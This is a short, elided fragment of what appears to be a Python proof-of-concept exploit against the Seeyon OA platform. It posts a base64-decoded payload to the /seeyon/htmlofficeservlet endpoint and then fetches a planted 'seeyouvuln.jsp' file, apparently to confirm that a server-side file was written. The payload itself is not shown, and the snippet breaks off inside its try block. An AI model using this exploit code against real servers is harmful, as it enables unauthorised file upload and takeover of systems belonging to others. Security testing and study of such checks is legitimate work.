...
def poc(url, **kwargs):
    ...
    try:
        req = requests.post(url + '/seeyon/htmlofficeservlet', headers=ua, data=base64.b64decode(pk2), timeout=60)
        time.sleep(1.5)
        req2 = requests.get(url + '/seeyon/seeyouvuln.jsp', allow_redirects=False, timeout=60)
